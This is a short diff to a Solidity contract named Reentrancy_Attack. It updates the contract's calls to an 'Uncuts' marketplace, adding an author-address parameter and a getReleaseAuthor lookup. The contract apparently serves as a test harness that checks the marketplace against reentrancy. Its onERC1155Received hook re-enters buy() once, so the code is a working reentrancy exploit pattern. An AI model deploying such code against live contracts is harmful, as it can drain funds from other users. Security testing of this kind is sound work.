@@ -7,10 +7,15 @@ import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 interface Uncuts {
     function buy(
         address to,
+        address authorAddress,
         uint256 id,
         uint256 amount,
         uint256 maxSpentLimit
     ) external returns (uint256, uint256, uint256, uint256);
+
+    function getReleaseAuthor(
+        uint256 releaseId
+    ) external view returns (address);
 }
 
 contract Reentrancy_Attack is ERC1155Holder {
@@ -31,7 +36,14 @@ contract Reentrancy_Attack is ERC1155Holder {
         uint256 amount,
         uint256 maxSpentLimit
     ) external {
-        uncuts_contract.buy(address(this), id, amount, maxSpentLimit);
+        address tokenAuthor = uncuts_contract.getReleaseAuthor(id);
+        uncuts_contract.buy(
+            address(this),
+            tokenAuthor,
+            id,
+            amount,
+            maxSpentLimit
+        );
     }
 
     function onERC1155Received(
@@ -43,7 +55,14 @@ contract Reentrancy_Attack is ERC1155Holder {
     ) public virtual override returns (bytes4) {
         if (!reentrant) {
             reentrant = true;
-            uncuts_contract.buy(address(this), 1, 1, type(uint256).max);
+            address tokenAuthor = uncuts_contract.getReleaseAuthor(1);
+            uncuts_contract.buy(
+                address(this),
+                tokenAuthor,
+                1,
+                1,
+                type(uint256).max
+            );
         }
 
         return this.onERC1155Received.selector;
